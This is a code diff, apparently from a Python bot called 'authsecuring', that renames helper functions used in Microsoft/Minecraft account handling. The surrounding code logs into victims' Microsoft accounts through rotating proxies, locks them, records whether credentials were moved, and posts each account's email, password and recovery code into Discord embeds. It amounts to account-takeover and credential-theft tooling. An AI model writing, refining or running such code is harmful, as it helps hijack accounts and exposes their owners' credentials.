@@ -1,18 +1,18 @@
 from authsecuring.utils.cookies.get_livedata import livedata
 from authsecuring.embed_builder import (
-    add_cred_line_field,
-    assemble_account_embeds,
-    make_failure_embed,
-    public_decline_reason,
+    add_credential_line_field,
+    build_account_embeds,
+    build_failure_embed,
+    public_secure_reason,
 )
 from authsecuring.auth.polish_host import polish_session
-from authsecuring.auth.get_msaauth import acquire_msaauth
+from authsecuring.auth.get_msaauth import acquire_msauth
 from authsecuring.auth.initial_session import open_session, clone_with_fresh_proxy
 from authsecuring.utils.secure import lock_account
 from authsecuring.filters import rejection_cause
 from authsecuring.banwatch import run_ban_sweep
 
-from authsecuring.utils.proxy import retry_with_proxy, proxy_error_reason
+from authsecuring.utils.proxy import run_with_proxy_retry, proxy_error_reason
 from storage.romeo_db import RomeoDB as DBConnection
 from discord import Embed
 import asyncio
@@ -67,8 +67,8 @@ async def _reject(email: str, why: str, record: dict, *, creds_changed: bool) ->
 
     return {
         "failed": True,
-        "reason": public_decline_reason(why),
-        "error": public_decline_reason(detail),
+        "reason": public_secure_reason(why),
+        "error": public_secure_reason(detail),
         "microsoft": ms,
         "minecraft": mc,
         "creds_moved": creds_changed,
@@ -120,13 +120,13 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
         return await acquire_msauth(client, email, device, live, code, ppft)
 
     try:
-        msaauth, sesja = await retry_with_proxy(
+        msaauth, sesja = await run_with_proxy_retry(
             sesja,
             _login_pass,
             new_session=open_session,
-            tries=4,
-            rotate_after=1,
-            tag="livedata-login",
+            attempts=4,
+            rotate_ssid_after=1,
+            label="livedata-login",
             email=email,
         )
     except Exception as exc:
@@ -250,7 +250,7 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
         db.store_locked(aid, account)
 
     try:
-        return await assemble_account_embeds(account, elapsed, aid)
+        return await build_account_embeds(account, elapsed, aid)
     except Exception as exc:
         rom.exception("assemble failed after lock")
         ms = account["microsoft"]
@@ -264,7 +264,7 @@ async def romeo_secure(sesja: httpx.AsyncClient, email, device=None,
         fb.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
         fb.add_field(name="Recovery", value=f"```{ms.get('rec_code', 'Unknown')}```", inline=False)
         fb.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
-        add_cred_line_field(
+        add_credential_line_field(
             fb,
             email=ms.get("email", ""),
             recovery=ms.get("recovery_code", ""),
